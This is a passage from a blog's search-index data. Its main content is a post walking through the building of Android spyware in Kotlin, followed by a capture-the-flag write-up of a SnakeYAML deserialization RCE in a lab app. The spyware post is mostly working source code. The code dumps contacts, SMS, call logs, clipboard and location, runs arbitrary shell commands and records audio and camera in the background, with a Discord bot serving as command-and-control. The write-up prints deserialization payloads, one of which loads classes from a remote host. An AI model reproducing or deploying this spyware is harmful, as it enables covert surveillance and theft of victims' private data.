is interesting because this is my first time playing around malicious APK and I have no idea if it would affect anything on both my devices and my machine. As usual, I started out with static analysis first.\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eI started out with both \u003ccode\u003ejadx\u003c/code\u003e and \u003ccode\u003eapktool\u003c/code\u003e but it has some error which fail to decompile the APK.\u003c/p\u003e","title":"Android Spyware Maybank2u APK"},{"content":"Prerequisite Android Studio kotlin Android Emulator or physical devices Discord as C2 I tested out this project in API 33 rooted device. Anything above API 33 might need to perform some modification to get everything works.\nCreating the spyware I created this project using Android Studio and Kotlin. This project took me around 16 hours to complete with massive help of GPT.\nPart 0 I started off by creating a project in Android Studio by pressing New Project \u0026gt; Empty Activity and provide a name. It will have some generated code and function.\nPart 1 Here\u0026rsquo;s the part where I started to create a function that request for all the required permission. Starting with AndroidManifest.xml, I will need to declare the required permission first.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_CONTACTS\u0026#34; /\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_CALL_LOG\u0026#34; /\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_SMS\u0026#34; /\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.ACCESS_FINE_LOCATION\u0026#34; /\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.ACCESS_COARSE_LOCATION\u0026#34; /\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.RECORD_AUDIO\u0026#34; /\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.FOREGROUND_SERVICE\u0026#34; /\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.CAMERA\u0026#34; /\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.INTERNET\u0026#34; /\u0026gt; \u0026lt;uses-feature android:name=\u0026#34;android.hardware.telephony\u0026#34; android:required=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;uses-feature android:name=\u0026#34;android.hardware.camera\u0026#34; android:required=\u0026#34;false\u0026#34; /\u0026gt; The permission here are required to read contacts, call log, SMS, GPS, recording audio, getting access to camera and Internet permission. Some of the permission are considered as \u0026ldquo;dangerous\u0026rdquo; which the app need to request the permission from user. Here\u0026rsquo;s a function to get permission from user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 @Composable fun RequestPermissionsAndExitIfDenied(context: Context) { val permissions = listOf( Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.RECORD_AUDIO, Manifest.permission.CAMERA ) var allGranted by remember { mutableStateOf( permissions.all { ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED } ) } val launcher = rememberLauncherForActivityResult( contract = ActivityResultContracts.RequestMultiplePermissions() ) { result -\u0026gt; val permissionStatusLog = buildString { result.forEach { (permission, isGranted) -\u0026gt; val status = if (isGranted) \u0026#34;GRANTED\u0026#34; else \u0026#34;DENIED\u0026#34; append(\u0026#34;Permission: $permission -\u0026gt; $status\\n\u0026#34;) } } allGranted = result.all { it.value } } LaunchedEffect(Unit) { if (!allGranted) { launcher.launch(permissions.toTypedArray()) } } } Part 2 Here\u0026rsquo;s the part where I created a new kotlin class thats works with Discord as C2. The class uses WebSocketClient which is something that I need to add in build.gradle.kts.\n1 implementation(\u0026#34;org.java-websocket:Java-WebSocket:1.5.2\u0026#34;) After adding this, sync the project again and it is possible to use the WebSocketClient now. There are 3 function in the class that I will discuss here is the onMessage and sendMessage and sendDiscordFileMessage.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 override fun onMessage(message: String?) { message?.let { try { val jsonMessage = JSONObject(it) // Update lastSequenceNumber if present if (!jsonMessage.isNull(\u0026#34;s\u0026#34;)) { lastSequenceNumber = jsonMessage.getInt(\u0026#34;s\u0026#34;) } // Listen for the GUILD_CREATE event to get the channel ID dynamically if (jsonMessage.getInt(\u0026#34;op\u0026#34;) == 0 \u0026amp;\u0026amp; jsonMessage.optString(\u0026#34;t\u0026#34;) == \u0026#34;GUILD_CREATE\u0026#34;) { val event = jsonMessage.getJSONObject(\u0026#34;d\u0026#34;) val channels = event.getJSONArray(\u0026#34;channels\u0026#34;) // Find the first text channel (type == 0) and get the channel ID for (i in 0 until channels.length()) { val channel = channels.getJSONObject(i) if (channel.getInt(\u0026#34;type\u0026#34;) == 0) { // 0 is a text channel channelId = channel.getString(\u0026#34;id\u0026#34;) println(\u0026#34;Channel ID: $channelId\u0026#34;) onChannelIdReceived?.invoke(channelId!!) break } } } // Process MESSAGE_CREATE events if (jsonMessage.getInt(\u0026#34;op\u0026#34;) == 0 \u0026amp;\u0026amp; jsonMessage.optString(\u0026#34;t\u0026#34;) == \u0026#34;MESSAGE_CREATE\u0026#34;) { val event = jsonMessage.getJSONObject(\u0026#34;d\u0026#34;) val content = event.getString(\u0026#34;content\u0026#34;) // Trigger the callback if defined onMessageReceived?.invoke(content) } } catch (e: Exception) { println(\u0026#34;Error parsing message: ${e.message}\u0026#34;) } } } OnMessage is a function from WebSocketClient so I will need to override it. This basically get the message from Discord server and return it in the onMessageReceived?.invoke(content).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 fun sendMessage(title: String,content: String) { val id = channelId if (id == null) { println(\u0026#34;Channel ID is not set. Cannot send message.\u0026#34;) return } // Define the URL to send the message val url = URL(\u0026#34;https://discord.com/api/v9/channels/$id/messages\u0026#34;) // Prepare the JSON payload to send the message val json = JSONObject().apply { put(\u0026#34;content\u0026#34;, \u0026#34;$title\\n```\\n$content\\n```\u0026#34;) } // Perform HTTP POST request asynchronously GlobalScope.launch(Dispatchers.IO) { try { // Set up the connection val connection = url.openConnection() as HttpURLConnection connection.requestMethod = \u0026#34;POST\u0026#34; connection.setRequestProperty(\u0026#34;Authorization\u0026#34;, \u0026#34;Bot $token\u0026#34;) // Set the Authorization header with the bot token connection.setRequestProperty(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;) connection.doOutput = true // Write the message content to the output stream withContext(Dispatchers.IO) { val os: OutputStream = connection.outputStream os.write(json.toString().toByteArray()) os.flush() } // Get the response code val responseCode = connection.responseCode if (responseCode == HttpURLConnection.HTTP_OK) { println(\u0026#34;Message sent successfully!\u0026#34;) } else { println(\u0026#34;Failed to send message. Response Code: $responseCode\u0026#34;) } connection.disconnect() } catch (e: Exception) { println(\u0026#34;Error sending message: ${e.message}\u0026#34;) } } } Moving on to sendMessage and sendDiscordFileMessage, both the function basically send message and files to the discord server as the bot. There are other functions which is important to start and maintain the discord bot in order to interact with it.\nPart 3 Here\u0026rsquo;s the part where I started to code the function to perform the spyware.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 fun Dump(context: Context,client: DiscordWebSocketClient,contentUri: Uri, logTag: String) { context.contentResolver.query(contentUri, null, null, null, null)?.use { cursor -\u0026gt; if (cursor.moveToFirst()) { do { val line = buildString { for (i in 0 until cursor.columnCount) { if (i \u0026gt; 0) append(\u0026#34;, \u0026#34;) append(cursor.getString(i)) } } Log.i(logTag, line) client.sendMessage(logTag, line) } while (cursor.moveToNext()) } } } This is Dump function where it is used to dump all information that I could get from content provider such as contact, SMS and call logs.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 fun getLastKnownLocation(context: Context,client: DiscordWebSocketClient) { val fusedLocationClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context) try { fusedLocationClient.lastLocation .addOnSuccessListener { location -\u0026gt; if (location != null) { Log.i(\u0026#34;Location\u0026#34;, \u0026#34;Lat: ${location.latitude}, Lon: ${location.longitude}\u0026#34;) val location = \u0026#34;Lat: ${location.latitude}, Lon: ${location.longitude}\u0026#34; client.sendMessage(\u0026#34;Location\u0026#34;, location) } else { Log.i(\u0026#34;Location\u0026#34;, \u0026#34;Location not available\u0026#34;) } } .addOnFailureListener { e -\u0026gt; Log.i(\u0026#34;Location\u0026#34;, \u0026#34;Error getting last known location\u0026#34;, e) } } catch (e: SecurityException) { Log.e(\u0026#34;Location\u0026#34;, \u0026#34;Location permission not granted\u0026#34;, e) } } 1 implementation(\u0026#34;com.google.android.gms:play-services-location:21.3.0\u0026#34;) this is getLastKnownLocation function where it will get the location of the device. To get precise location, I need to add another dependency in build.gradle.kts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 fun readClipboard(context: Context,client: DiscordWebSocketClient) { val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager if (clipboard.hasPrimaryClip()) { val clipData = clipboard.primaryClip val item = clipData?.getItemAt(0) val text = item?.coerceToText(context.applicationContext) if (!text.isNullOrEmpty()) { Log.i(\u0026#34;Clipboard\u0026#34;, \u0026#34;Clipboard content: $text\u0026#34;) client.sendMessage(\u0026#34;Clipboard\u0026#34;, \u0026#34;Clipboard content: $text\u0026#34;) } else { Log.i(\u0026#34;Clipboard\u0026#34;, \u0026#34;Clipboard is empty or non-text\u0026#34;) } } else { Log.e(\u0026#34;Clipboard\u0026#34;, \u0026#34;No clipboard content available\u0026#34;) } } This readClipboard function basically read the clipboard message.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 fun execute(command: String, client: DiscordWebSocketClient) { try { // Use a shell to support piping and redirection val processBuilder = ProcessBuilder(\u0026#34;/system/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, command) processBuilder.redirectErrorStream(true) val process = processBuilder.start() val output = BufferedReader(InputStreamReader(process.inputStream)).use { it.readText() } process.waitFor() // Limit message size for Discord val limitedOutput = if (output.length \u0026gt; 1900) output.take(1900) + \u0026#34;\\n[truncated]\u0026#34; else output client.sendMessage(\u0026#34;Command Executed: $command\u0026#34;, limitedOutput) Log.i(\u0026#34;Command\u0026#34;, \u0026#34;Executed: $command\\n$limitedOutput\u0026#34;) } catch (e: Exception) { client.sendMessage(\u0026#34;Execution Error\u0026#34;, e.message.toString()) Log.e(\u0026#34;Command\u0026#34;, \u0026#34;Error executing command: ${e.message}\u0026#34;, e) } } This execute function is for executing system command. Then there\u0026rsquo;s also AudioRecording and CamRecording which is a service in order to perform the audio and camera recording in background. All of these function will send the output to discord via the discord bot.\nPart 4 This part will focus on MainActivity\u0026rsquo;s onCreate function where the application will host the discord bot and provide a list of available command to trigger the function.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 if (DiscordClientManager.discordClient == null) { DiscordClientManager.discordClient = DiscordWebSocketClient() } DiscordClientManager.discordClient?.onChannelIdReceived = { DiscordClientManager.discordClient?.sendMessage(\u0026#34;\u0026gt; App started\u0026#34;,helpMsg) } DiscordClientManager.discordClient?.onMessageReceived = { message -\u0026gt; // Here, you can handle any messages that come from Discord println(\u0026#34;Message received: $message\u0026#34;) val command = message.trim() // Split the message into command and argument (everything after \u0026gt;cmd) val (baseCommand, argument) = if (command.startsWith(\u0026#34;\u0026gt;cmd\u0026#34;)) { command.split(\u0026#34; \u0026#34;, limit = 2).let { it.getOrElse(0) { \u0026#34;\u0026#34; } to it.getOrElse(1) { \u0026#34;\u0026#34; } } } else { command to \u0026#34;\u0026#34; } when (baseCommand) { \u0026#34;\u0026gt;help\u0026#34; -\u0026gt; DiscordClientManager.discordClient?.sendMessage(\u0026#34;\u0026gt; Help Menu\u0026#34;,helpMsg) \u0026#34;\u0026gt;Read Contact\u0026#34; -\u0026gt; Dump(this,DiscordClientManager.discordClient!! ,ContactsContract.CommonDataKinds.Phone.CONTENT_URI, \u0026#34;Contacts\u0026#34;) \u0026#34;\u0026gt;Read Call Log\u0026#34; -\u0026gt; Dump(this,DiscordClientManager.discordClient!! ,CallLog.Calls.CONTENT_URI, \u0026#34;Call log\u0026#34;) \u0026#34;\u0026gt;Read SMS\u0026#34; -\u0026gt; Dump(this,DiscordClientManager.discordClient!! ,Telephony.Sms.CONTENT_URI, \u0026#34;SMS\u0026#34;) \u0026#34;\u0026gt;Get Location\u0026#34; -\u0026gt; getLastKnownLocation(this,DiscordClientManager.discordClient!!) \u0026#34;\u0026gt;Get Clipboard\u0026#34; -\u0026gt; readClipboard(this,DiscordClientManager.discordClient!!) \u0026#34;\u0026gt;cmd\u0026#34; -\u0026gt; { if (argument.isNotEmpty()) { // Here, argument is everything after \u0026#34;\u0026gt;cmd\u0026#34;, e.g. \u0026#34;ls -la /var/www/html\u0026#34; execute(argument, DiscordClientManager.discordClient!!) } else { DiscordClientManager.discordClient?.sendMessage(\u0026#34;Command Error\u0026#34;,\u0026#34;\u0026gt;cmd \u0026lt;command\u0026gt;\u0026#34;) } } \u0026#34;\u0026gt;Record Audio\u0026#34; -\u0026gt; ContextCompat.startForegroundService(this, Intent(this, AudioRecording::class.java)) \u0026#34;\u0026gt;Record Front Cam\u0026#34; -\u0026gt; ContextCompat.startForegroundService(this, Intent(this, CamRecording::class.java).apply {putExtra(\u0026#34;cameraId\u0026#34;, \u0026#34;1\u0026#34;)}) \u0026#34;\u0026gt;Record Back Cam\u0026#34; -\u0026gt; ContextCompat.startForegroundService(this, Intent(this, CamRecording::class.java).apply {putExtra(\u0026#34;cameraId\u0026#34;, \u0026#34;0\u0026#34;)}) } } DiscordClientManager.discordClient?.start() This code basically get the message from onMessageReceived function and then it will trigger the function accordingly.\n1 2 3 4 RequestPermissionsAndExitIfDenied(this@MainActivity) Text(\u0026#34;it works\u0026#34;, modifier = Modifier.padding(innerPadding) ) The remaining part of the onCreate function is just requesting the permission and writing a dummy text.\nPart 5 This is the part where I need to create one discord bot and also a discord server with the bot in it.\nStep 1: Go to https://discord.com/developers/applications Step 2: Go to Applications and press New Application button and give it a random name. Step 3: Go to OAuth2 and tick bot under OAuth2 URL Generator and tick administrator in bot permission. it will create a URL that looks like https://discord.com/oauth2/authorize?client_id=\u0026lt;cliend_id\u0026gt;\u0026amp;permissions=8\u0026amp;integration_type=0\u0026amp;scope=bot Step 4: Go to Bot and enable Presence Intent, Server Members Intent and Message Content Intent. Step 5: Create a discord server and add your newly created bot by accessing the generated URL. Step 6: Copy the bot token (Press Reset Token to generate a new token if you dont see your token) and add it into the kotlin code. If everything works as intended, you will see a bot added into the server. Make sure to add the bot token into the code to allow the discord bot to be enabled.\nTesting out I tested the application on my rooted device API 33. When the application open for the first time, it will ask for the permission.\nIn my discord server, it will tell me that the app has started and send me a list of permission that is granted or not.\nThen I could just perform any command that to get the information that I want.\nConclusion This is just a random project that I decided to code to learn more about spyware. I used Discord as C2 because I dont want to host a server. There are some limitation in this project such as the application must be opened to trigger the command in discord.\nRepo https://github.com/callmeks/spyware ","permalink":"https://callmeks.github.io/posts/android-spyware-development/","summary":"\u003ch2 id=\"prerequisite\"\u003ePrerequisite\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eAndroid Studio\u003c/li\u003e\n\u003cli\u003ekotlin\u003c/li\u003e\n\u003cli\u003eAndroid Emulator or physical devices\u003c/li\u003e\n\u003cli\u003eDiscord as C2\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eI tested out this project in API 33 rooted device. Anything above API 33 might need to perform some modification to get everything works.\u003c/p\u003e\n\u003ch2 id=\"creating-the-spyware\"\u003eCreating the spyware\u003c/h2\u003e\n\u003cp\u003eI created this project using Android Studio and Kotlin. This project took me around 16 hours to complete with massive help of GPT.\u003c/p\u003e\n\u003ch3 id=\"part-0\"\u003ePart 0\u003c/h3\u003e\n\u003cp\u003eI started off by creating a project in Android Studio by pressing \u003ccode\u003eNew Project \u0026gt; Empty Activity\u003c/code\u003e and provide a name. It will have some generated code and function.\u003c/p\u003e","title":"Android Spyware Development"},{"content":"Challenge Description Welcome to the Config Editor Challenge! In this lab, you\u0026rsquo;ll dive into a realistic situation involving vulnerabilities in a widely-used third-party library. Your objective is to exploit a library-induced vulnerability to achieve RCE on an Android application.\nconfigeditor.apk\nSolution As usual, I started out by performing static analysis to read the code.\nStatic Analysis I started by looking into the AndroidManifest.xml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.configeditor.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;file\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;http\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt; \u0026lt;data android:mimeType=\u0026#34;application/yaml\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; There\u0026rsquo;s only one activity and it has a intent filter which accept URI parameter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 private final void handleIntent() { Intent intent = getIntent(); String action = intent.getAction(); Uri data = intent.getData(); if (Intrinsics.areEqual(\u0026#34;android.intent.action.VIEW\u0026#34;, action) \u0026amp;\u0026amp; data != null) { CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1\u0026lt;Uri, Unit\u0026gt;() { // from class: com.mobilehackinglab.configeditor.MainActivity$handleIntent$1 { super(1); } @Override // kotlin.jvm.functions.Function1 public /* bridge */ /* synthetic */ Unit invoke(Uri uri) { invoke2(uri); return Unit.INSTANCE; } /* renamed from: invoke, reason: avoid collision after fix types in other method */ public final void invoke2(Uri uri) { MainActivity mainActivity = MainActivity.this; Intrinsics.checkNotNull(uri); mainActivity.loadYaml(uri); } })); } } Moving on to MainActivity code, there\u0026rsquo;s a handleIndent function where it will receive incoming intent and execute several function such as CopyUtil.INSTANCE.copyFileFromUri and loadYaml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public final void loadYaml(Uri uri) { try { ParcelFileDescriptor openFileDescriptor = getContentResolver().openFileDescriptor(uri, \u0026#34;r\u0026#34;); try { ParcelFileDescriptor parcelFileDescriptor = openFileDescriptor; FileInputStream inputStream = new FileInputStream(parcelFileDescriptor != null ? parcelFileDescriptor.getFileDescriptor() : null); DumperOptions $this$loadYaml_u24lambda_u249_u24lambda_u248 = new DumperOptions(); $this$loadYaml_u24lambda_u249_u24lambda_u248.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK); $this$loadYaml_u24lambda_u249_u24lambda_u248.setIndent(2); $this$loadYaml_u24lambda_u249_u24lambda_u248.setPrettyFlow(true); Yaml yaml = new Yaml($this$loadYaml_u24lambda_u249_u24lambda_u248); Object deserializedData = yaml.load(inputStream); String serializedData = yaml.dump(deserializedData); ActivityMainBinding activityMainBinding = this.binding; if (activityMainBinding == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;binding\u0026#34;); activityMainBinding = null; } activityMainBinding.contentArea.setText(serializedData); Unit unit = Unit.INSTANCE; Closeable.closeFinally(openFileDescriptor, null); } finally { } } catch (Exception e) { Log.e(TAG, \u0026#34;Error loading YAML: \u0026#34; + uri, e); } } Looking into the loadYaml function, it seems to be something related to YAML deserialization where it will perform load and dump function.\n1 import org.yaml.snakeyaml.Yaml; After looking into the imports, I noticed that the YAML is using snakeyaml. I then googled it and found some useful information such as this and this which it is possible to gain RCE.\n1 2 3 4 5 6 public final class LegacyCommandUtil { public LegacyCommandUtil(String command) { Intrinsics.checkNotNullParameter(command, \u0026#34;command\u0026#34;); Runtime.getRuntime().exec(command); } } Another thing is that there is a class and function LegacyCommandUtil where it is possible to execute command. I believe this will be used together with the YAML deserialization with SnakeYAML. Time to perform dynamic analysis to see how it actually works.\nDynamic Analysis I started by playing around with the application and provide some intent to meet the criteria.\n1 2 PS C:\\\u0026gt; adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d \u0026#34;http://192.168.68.107:8001/test.yaml\u0026#34; Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8001/... cmp=com.mobilehackinglab.configeditor/.MainActivity } From what I understand, this process basically just deserialize it using yaml.load and serialize back it using yaml.dump. Based on this article, I tried to use the payload and see if its work.\n1 !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\u0026#34;http://192.168.68.107:8001/yeet\u0026#34;] ]] ] 1 2 PS C:\\\u0026gt; adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d \u0026#34;http://192.168.68.107:8001/test.yaml\u0026#34; Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8001/... cmp=com.mobilehackinglab.configeditor/.MainActivity } It seem\u0026rsquo;s like something is wrong and the POC provided did not work. I then tried to understand how the YAML deserialization works and see what I could do. After understanding it, I noticed that it has something to do with classes and the LegacyCommandUtil has classes in it. I then craft a payload and try to execute the LegacyCommandUtil function.\n1 !!com.mobilehackinglab.configeditor.LegacyCommandUtil [\u0026#34;touch /sdcard/Documents/configeditorhacked.txt\u0026#34;] 1 2 PS C:\\\u0026gt; adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d \u0026#34;http://192.168.68.107:8001/hacked.yaml\u0026#34; Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8001/... cmp=com.mobilehackinglab.configeditor/.MainActivity } After a few attempt, I tried the yaml payload and it managed to rendered back in the page. I then checked it my RCE is successful or not.\n1 2 3 beryllium:/sdcard/Documents # ls -la total 0 -rw-rw---- 1 root everybody 0 2025-04-09 17:07 configeditorhacked.txt This proof that the YAML deserialization executed the LegacyCommandUtil function and I managed to create a file in specific directory.\nThings I learned from this challenge YAML deserialization SnakeYAML CVE ","permalink":"https://callmeks.github.io/posts/mhl-config-editor/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelcome to the Config Editor Challenge! In this lab, you\u0026rsquo;ll dive into a realistic situation involving vulnerabilities in a widely-used third-party library. Your objective is to exploit a library-induced vulnerability to achieve RCE on an Android application.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/configeditor.apk\"\u003econfigeditor.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eAs usual, I started out by performing static analysis to read the code.\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eI started by looking into the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" 